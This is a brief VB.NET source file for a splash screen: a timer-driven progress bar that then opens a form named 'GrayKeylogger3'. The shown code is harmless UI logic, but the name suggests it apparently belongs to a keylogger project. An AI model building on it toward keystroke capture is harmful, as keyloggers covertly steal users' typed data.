Imports System.Threading

Public Class Splash
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Panel2.Width >= Panel1.Width Then launch()
        Panel2.Width += 2
    End Sub
    Private Sub Form1_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        Timer1.Start()
    End Sub
    Sub launch()
        Timer1.Stop()
        Dim t As Thread = New Thread(New ThreadStart(AddressOf OpenForm))
        t.Start()
        Close()
    End Sub
    Public Shared Sub OpenForm()
        Application.Run(New GrayKeylogger3())
    End Sub
End Class
